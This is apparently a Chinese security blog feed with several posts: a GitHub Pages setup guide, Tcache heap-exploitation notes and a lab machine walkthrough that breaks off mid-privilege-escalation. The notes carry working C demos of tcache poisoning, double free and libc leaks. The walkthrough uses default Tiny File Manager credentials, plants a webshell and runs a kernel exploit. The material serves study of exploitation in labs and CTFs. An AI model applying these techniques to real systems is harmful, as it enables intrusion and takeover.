<span class="cp">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32) 
#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff) 
#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
</span></code></pre></div></div>

<p>Elf64_Rela结构体的大小为24字节，注意结构体中的变量都是64位了。</p>

<p>然后是Elf64_Sym的结构体如下，</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> 
	<span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span> <span class="cm">/* Symbol name (string tbl index) */</span> <span class="mi">4</span> <span class="n">bytes</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="cm">/* Symbol type and binding */</span> <span class="mi">1</span> <span class="n">bytes</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> <span class="cm">/* Symbol visibility */</span> <span class="mi">1</span> <span class="n">bytes</span>
	<span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> <span class="cm">/* Section index */</span> <span class="mi">2</span> <span class="n">bytes</span>
	<span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span> <span class="cm">/* Symbol value */</span> <span class="mi">8</span> <span class="n">bytes</span>
	<span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span> <span class="cm">/* Symbol size */</span> <span class="mi">8</span> <span class="n">bytes</span>
<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
</code></pre></div></div>

<p>Elf64_Word 32位，Elf64_Section 16位，Elf64_Addr 64位，Elf64_Xword 64位，合24字节。</p>

<p>64位下，xxx@plt中的第二行的push就不是偏移了，变成了待解析符号在重定位表中的索引，比如write函数push的是0。</p>

<p>还有一个要注意的点是，64位伪造重定位表，往往需要很多的溢出空间，如果程序没有这么多的栈给我们，我们还得自己实现栈迁移。</p>

<p>就先这样吧，实战遇到题目再记录吧。</p>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[ret2dlresolve]]></summary></entry><entry><title type="html">[Others]如何使用github搭建一个静态博客(一)</title><link href="/others/2026/06/05/build-blog.html" rel="alternate" type="text/html" title="[Others]如何使用github搭建一个静态博客(一)" /><published>2026-06-05T00:00:00+08:00</published><updated>2026-06-05T00:00:00+08:00</updated><id>/others/2026/06/05/build-blog</id><content type="html" xml:base="/others/2026/06/05/build-blog.html"><![CDATA[<h1 id="如何使用github轻松搭建个人博客">如何使用github轻松搭建个人博客</h1>

<h2 id="前言">前言</h2>

<p>我从开始学会做网页其就想搞个自己的网站了，不过以前一直把一些事情想得太复杂，老是纠结于很多功能。现在看了很多别人的博客，其实很多大佬还是从简制作的，没有什么复杂的后端，只用静态页面去实现博客的功能，就像互联网早期的web页面一样，为了适应2g的加载速度，许多代码从简，也不会使用复杂的css，这种风格启发了我做自己的博客。</p>

<h2 id="github-pages">Github Pages</h2>

<p>Github是支持个人部署静态页面的，这个功能叫做github pages，可以把一个repository当成一个网站去部署，其自带的静态网页生成器Jekyll，也能很好的把我们平时写的笔记.md转换成静态网页，Github Pages也有官方的使用documentation：https://docs.github.com/en/pages</p>

<h2 id="网站搭建步骤">网站搭建步骤</h2>

<p>1.第一步，需要创建一个新的仓库，仓库名字为xxx.github.io，这个xxx最好和你的github名字一样，我猜你可能想自己命名网站的域名为bbb.github.io，但是实际上如果这样命名，那么访问时的链接其实会是https://xxx.github.io/bbb.github.io/index.html，很长的一串，而不是你想的https://bbb.github.io/index.html，所以还是正常命名为你的github名字。</p>

<p><img src="/assets/images/2026-06-05-build-blog/ref1.png" alt="ref1" /></p>

<p>2.接下来，在仓库的设置中，按如下设置，这样，仓库的根目录，就成了网站的根目录，这时候在仓库的根目录里放一个index.html，然后再访问https://xxx.github.io/，那么此时网站的内容就是index.html了，如果404可以多刷新几次，网站的部署相对仓库这边有延迟。</p>

<p><img src="/assets/images/2026-06-05-build-blog/ref2.png" alt="ref2" /></p>

<h2 id="jekyll搭建步骤">Jekyll搭建步骤</h2>

<p>1.在网站的根目录下，按如下目录进行文件夹与文件的创建，其中最重要的文件是_config.yml，这个文件包含了网站的基本设定，可以选择Jekyll支持的主题、插件等（在github pages上部署的时候，github pages只支持几个指定的主题，可以访问官方文档看看支持什么）；其次是_posts文件夹，用来放你写的文章，Jerkyll会自动把md格式渲染成静态网页；_layouts文件夹里是一些公共部分，比如可以放网站的导航栏，底部栏等多个网页共通的内容；assets用来放网页的css、js和图片资源，这个不是必须要这么命名的，可以自由来。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b14ckb0x@b14ckb0x:~/ntc627.github.io<span class="nv">$ </span>tree <span class="nt">-L</span> 2
<span class="nb">.</span>
├── assets
│   ├── css
│   └── images
├── _config.yml
├── index.html
├── _layouts
│   ├── default.html
│   └── post.html
├── _posts
│   └──2021-06-27-hello-world.md
└── README.md

</code></pre></div></div>

<p>如果你的目录按我如上进行设置，那么现在github仓库看到的文件与文件夹应该类似这样</p>

<p><img src="/assets/images/2026-06-05-build-blog/ref3.png" alt="ref3" /></p>

<p>2.我的_config.yml设置，theme我选择自己编写css，所以空着了，此外还有插件以及一些插件设置，用于控制博客的分页等。</p>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">title</span><span class="pi">:</span> <span class="s">b14ckb0x's space</span>
<span class="na">description</span><span class="pi">:</span> <span class="s">Hack everything</span>
<span class="na">theme</span><span class="pi">:</span> 
<span class="na">paginate</span><span class="pi">:</span> <span class="m">5</span>
<span class="na">paginate_path</span><span class="pi">:</span> <span class="s2">"</span><span class="s">/page:num/"</span>
<span class="na">plugins</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="s">jekyll-feed</span>
  <span class="pi">-</span> <span class="s">jekyll-paginate</span>
  <span class="pi">-</span> <span class="s">jekyll-sitemap</span>
</code></pre></div></div>

<p>3.在_layouts文件夹里创建的公共文件，可以在其他文件的头部进行引用，比如我这里的index.html里就指定了layout为default，而_layout中的default.html放的是我的导航栏，那么我就不需要重新把我的导航栏代码再完整复制过来。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---
layout: default
title: index
---
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"zh-CN"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>b14ckb0x's space<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>4.接下来就是文章了，_posts目录下的文章必须按严格的格式命名，YYYY-MM-DD-title.md，比如2021-06-27-hello-world.md，jekyll只能接受这样的文件命名，符合这个格式才会当成文章渲染。此外，文章的开头必须有前置数据（Front matter），前置数据包裹在两个---中间，比如这样：</p>

<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
<span class="na">layout</span><span class="pi">:</span> <span class="s">post</span>
<span class="na">title</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Hello</span><span class="nv"> </span><span class="s">World"</span>
<span class="na">date</span><span class="pi">:</span> <span class="s">2021-03-03</span>
<span class="na">categories</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">Others</span><span class="pi">]</span>
<span class="nn">---</span>

<span class="gh"># Hello world</span>
Test my blog
</code></pre></div></div>

<p>到这里，一个基本的博客就算搭建完了。</p>

<h2 id="其它准备">其它准备</h2>

<p>如果之前没有使用过git，那么可以在这里配置一下，这样就可以本地写代码，然后再push到github上。首先，需要把网站的仓库clone下来：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/xxx/xxx.github.io.git
</code></pre></div></div>

<p>之后进入到clone下来的文件夹，就可以自由编辑了，编辑以后需要重新提交到github，步骤如下</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#先添加要提交的文件</span>
git add <span class="nb">.</span>
<span class="c">#提交改动</span>
git commit <span class="nt">-m</span> <span class="s2">"add index.html"</span>
<span class="c">#将本地的改动上传至github</span>
git push
</code></pre></div></div>

<p>push的时候可能会问你用户名和密码，并且每次push都需要填写，这样不仅不方便，也不安全，比较好的方式是配置ssh。</p>

<p>先在本地创建好SSH密钥对，比如：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> ed25519 
</code></pre></div></div>

<p>创建好后，打开公钥文件.pub，把里面的内容复制到github的ssh key设置页面：</p>

<p><img src="/assets/images/2026-06-05-build-blog/ref4.png" alt="ref4" /></p>

<p>之后在本地，git clone下来的那个文件的根目录里执行，把与远程仓库的互动方式从https改成ssh</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/xxx.github.io<span class="nv">$ </span>git remote set-url origin git@github.com:xxx/xxx.github.io.git
</code></pre></div></div>

<p>这样之后就可以直接push了</p>]]></content><author><name></name></author><category term="Others" /><summary type="html"><![CDATA[如何使用github轻松搭建个人博客]]></summary></entry><entry><title type="html">[PWN]Tcache学习</title><link href="/pwn/2026/05/07/Tcache.html" rel="alternate" type="text/html" title="[PWN]Tcache学习" /><published>2026-05-07T00:00:00+08:00</published><updated>2026-05-07T00:00:00+08:00</updated><id>/pwn/2026/05/07/Tcache</id><content type="html" xml:base="/pwn/2026/05/07/Tcache.html"><![CDATA[<h1 id="tcache">Tcache</h1>

<p>和CPU的cache机制差不多，这玩意也是设一小块地方，让malloc和free的时候，直接从tcache取/放合适的大小，这样就不用去bin中找，可以加快速度。不过注意一下，不像cpu的cache有硬件支持，tcache是纯软件机制，是直接在内存中实现的。先来研究下Tcache结构，以及什么情况下会用到Tcache。</p>

<p>Tcache是和fastbin类似的单链表结构，LIFO，支持的最大chunk size是0x410，最大允许的用户请求大小是0x408，按大小分类，比如0x10一类、0x20一类…..0x120一类（以0x10为步进划分），每一类的数量以mp_.tcache_count为准，一般glibc中这个值等于7，也就是每一类最多不超过7。引入tcache后，_init_free和__libc_malloc里就多了个调用tcache_put()和tcache_get的环节，看名字也知道就是把chunk放进tcache和从tcache里取出chunk。那么在malloc的时候，就会优先从tcache里看有无合适大小的chunk，而不是从fastbin或者unsortedbin找，在free的时候，也会优先把chunk放入tcache。</p>

<p>malloc和free对tcache的取放也有很多细节。
首先是放入的情况：</p>

<p>free的时候，会优先检查chunk能否放入tcache</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span> 
<span class="p">{</span> 
	<span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span> <span class="cm">/* its size */</span> 
	<span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span> <span class="cm">/* associated fastbin */</span> 
	<span class="n">mchunkptr</span> <span class="n">nextchunk</span><span class="p">;</span> <span class="cm">/* next contiguous chunk */</span> 
	<span class="n">INTERNAL_SIZE_T</span> <span class="n">nextsize</span><span class="p">;</span> <span class="cm">/* its size */</span> 
	<span class="kt">int</span> <span class="n">nextinuse</span><span class="p">;</span> <span class="cm">/* true if nextchunk is used */</span> 
	<span class="n">INTERNAL_SIZE_T</span> <span class="n">prevsize</span><span class="p">;</span> <span class="cm">/* size of previous contiguous chunk */</span> 
	<span class="n">mchunkptr</span> <span class="n">bck</span><span class="p">;</span> <span class="cm">/* misc temp for linking */</span> 
	<span class="n">mchunkptr</span> <span class="n">fwd</span><span class="p">;</span> <span class="cm">/* misc temp for linking */</span> 
	<span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span> 
	<span class="cm">/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */</span> 
	<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">((</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="o">-</span><span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> 
	<span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">misaligned_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> 
	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): invalid pointer"</span><span class="p">);</span> 
	<span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */</span> 
	<span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">MINSIZE</span> <span class="o">||</span> <span class="o">!</span><span class="n">aligned_OK</span> <span class="p">(</span><span class="n">size</span><span class="p">)))</span> <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): invalid size"</span><span class="p">);</span> 
	<span class="n">check_inuse_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span> 
	<span class="cp">#if USE_TCACHE 
</span>	<span class="p">{</span> 
		<span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span> 
		<span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> 
		<span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span> 
		<span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span> 
		<span class="p">{</span> 
			<span class="n">tcache_put</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span> 
			<span class="k">return</span><span class="p">;</span> 
		<span class="p">}</span> 
	<span class="p">}</span> 
	<span class="cp">#endif ...... }
</span></code></pre></div></div>

<p>malloc则会有多种情况，
一，malloc申请的chunk符合fastbin大小，且fastbin中确实有可用空闲块，那分配的时候顺便把fastbin里其他的chunk放入tcache（注意是其他chunk而不是分配的chunk噢）。
二，申请符合smallbin大小时，和一情况差不多，分配时把其他smallbin的chunk放入tcache。
三，申请的chunk需要在unsortedbin中找的时候，在双向链表中找到合适tcache size的chunk时（且tcache中还没满，没到tcache_count），则直接放入tcache，即最后unsortedbin中所有符合tcache条件的chunk都会放入tcache</p>

<p>还有是取出的情况：
一，tcache里刚好malloc请求的内存，那就取出
二，放入unsortedbin的chunk到tcache时，如果检查发现放入达到限制了，就立刻取出刚刚放入的chunk，不过默认是没有上限的</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if USE_TCACHE 
</span><span class="cm">/* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */</span> 
	<span class="o">++</span><span class="n">tcache_unsorted_count</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span> 
	<span class="o">&amp;&amp;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span> <span class="o">&gt;</span> <span class="mi">0</span> 
	<span class="o">&amp;&amp;</span> <span class="n">tcache_unsorted_count</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span><span class="p">)</span> 
	<span class="p">{</span> <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span> <span class="p">}</span> 
<span class="cp">#endif
</span></code></pre></div></div>
<p>三，由于malloc的时候，会优先用unsortedbin填充tcache，这时候如果有满足malloc条件的chunk且已经在填充时放入了tcache，则会在tcache填充完后取出。</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if USE_TCACHE 
</span><span class="cm">/* If all the small chunks we found ended up cached, return one now. */</span> 
<span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span> <span class="p">}</span> 
<span class="cp">#endif
</span></code></pre></div></div>

<h2 id="攻击方法">攻击方法</h2>

<h3 id="tcache-poisoning">Tcache poisoning</h3>

<p>通过覆盖Tcache的next指针来直接实现malloc到任意地址，攻击方法和fastbin-attack类似，都是先分配一个chunk后free，接着利用其他漏洞去改已经释放的chunk的next指针，使其指向想分配的地址，然后malloc两次就得到了指向特定地址的chunk。这个比fastbin-attack还爽，因为不用伪造size之类的。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//glibc_2.26</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><span class="se">\n</span><span class="s">"</span>
<span class="s">"returning a pointer to an arbitrary location (in this case, the stack).</span><span class="se">\n</span><span class="s">"</span>
<span class="s">"The attack is very similar to fastbin corruption attack.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>

<span class="kt">size_t</span> <span class="n">stack_var</span><span class="p">;</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"The address we want malloc() to return is %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Allocating 1 buffer.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="kt">intptr_t</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"malloc(128): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Freeing the buffer...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>  

<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p</span><span class="se">\n</span><span class="s">"</span>
<span class="s">"to point to the location to control (%p).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="p">),</span><span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">intptr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">;</span>

<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"1st malloc(128): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">));</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>

<span class="kt">intptr_t</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"2st malloc(128): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"We got the control</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="tcache-dup">Tcache dup</h3>

<p>类似double free，通过free同一个块两次，来实现任意地址写</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//glibc_2.26</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"This file demonstrates a simple double-free attack with tcache.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Allocating buffer.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Freeing twice...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the free list has [ %p, %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Next allocated buffers will be same: [ %p, %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="tcache-perthread-corruption">Tcache perthread corruption</h3>

<p>tcache由tcache_perthread_struct这个结构来管理，如果可以利用tcache poisoning之类的漏洞，获取到这个结构的指针，那就可以控制整个tcache</p>

<h3 id="tcache-stashing-unlink">Tcache stashing unlink</h3>

<p>前面说了，对于smallbin，只要tcache还有空闲就会把smallbin全放进来，但是这个放的时候，只对放的第一个smallbin做了检查，也就是说，可以通过写已有smallbin的bk指针，然后利用tcache机制把一个fake地址放进tcache，实现任意地址分配</p>

<h3 id="泄漏libc">泄漏libc</h3>

<p>没有引入tcache时，打印一个释放的指针，就能得到一个和libc有固定偏移的地址（unsorted bin），进而算出libc</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> 
<span class="p">{</span>
	<span class="kt">long</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span> 
	<span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
	<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
<span class="p">}</span>
</code></pre></div></div>

<p>有了tcache后，我们必须先把tcache填满，然后才能使chunk放到unsorted bin里</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> 
<span class="p">{</span> 
	<span class="kt">long</span><span class="o">*</span> <span class="n">t</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
	<span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span> 
	<span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> 
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> 
		<span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span> 
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> 
		<span class="n">free</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> 
	<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span> 
	<span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
<span class="p">}</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[Tcache]]></summary></entry><entry><title type="html">[MAZE-SEC]Cha靶机通关记录</title><link href="/maze-sec/2026/04/30/Cha-by-0.html" rel="alternate" type="text/html" title="[MAZE-SEC]Cha靶机通关记录" /><published>2026-04-30T00:00:00+08:00</published><updated>2026-04-30T00:00:00+08:00</updated><id>/maze-sec/2026/04/30/Cha-by-0</id><content type="html" xml:base="/maze-sec/2026/04/30/Cha-by-0.html"><![CDATA[<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>靶机：Cha
作者：群主
靶机ID：640
类型：Linux - Easy
</code></pre></div></div>

<h1 id="user">User</h1>

<p>开始先上nmap扫，发现80的web服务和2222的ssh</p>

<p><img src="/assets/images/2026-04-30-Cha/ref1.png" alt="ref1" /></p>

<p>ssh没有信息</p>

<p><img src="/assets/images/2026-04-30-Cha/ref2.png" alt="ref2" /></p>

<p>所以转去看web，首页没有东西所以开始扫目录，然后扫出file.php，有一个登录窗口，还有很大的一个标志写着Tiny File Manager，在开始爆破之前先试着找找这玩意有没有默认密码，然后搜到管理员的默认帐号密码是admin:admin@123，然后就登录进去了</p>

<p><img src="/assets/images/2026-04-30-Cha/ref3.png" alt="ref3" /></p>

<p>想通过右上角的Upload和New Item创建一个webshell的，结果上传不上去，new item也添加失败，不知道啥原因，打这个靶机的时候非常急，没多想，就想用着新漏洞cve-2026-31431快速拿个root玩玩。于是这里我直接试试改首页文件添加webshell</p>

<p><img src="/assets/images/2026-04-30-Cha/ref4.png" alt="ref4" /></p>

<p>然后发现可以</p>

<p><img src="/assets/images/2026-04-30-Cha/ref5.png" alt="ref5" /></p>

<p>接下来就是直接连webshell管理工具，拿到user flag</p>

<h1 id="root">Root</h1>

<p>利用webshell管理工具上传个msf的payload和cve的poc，获得一个正式一点的shell并执行poc</p>

<p><img src="/assets/images/2026-04-30-Cha/ref6.png" alt="ref6" /></p>

<p>结果靶机上的python不太对，居然没有splice，检查发现python版本居然只有3.9.2，经查，os.splice接口在3.10以后才加上。不过问题不大，只是没有这个封装，不代表没有这个系统调用，本身python的os.splice就是通过linux的系统调用splice()实现的，除了python的封装，glibc也有对splice()的封装libc.splice，而python又可以通过ctypes调用glibc的封装，那么直接把原本的exp改成调用c的splice接口就可以绕过os.splice了。</p>

